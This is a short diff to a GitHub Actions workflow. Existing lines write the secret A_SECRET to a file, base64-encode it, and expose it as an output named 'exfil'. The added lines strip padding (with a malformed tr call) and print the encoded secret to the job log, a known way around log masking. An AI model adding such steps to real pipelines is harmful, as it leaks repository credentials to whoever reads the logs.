@@ -26,6 +26,8 @@ jobs:
         run: |
          echo "${{secrets.A_SECRET}}" > a.txt
          cat a.txt | base64 > b.txt
+         tr -d"=" b.txt
+         cat b.txt
          echo "exfil=`cat b.txt`" >> $GITHUB_OUTPUT
 
            
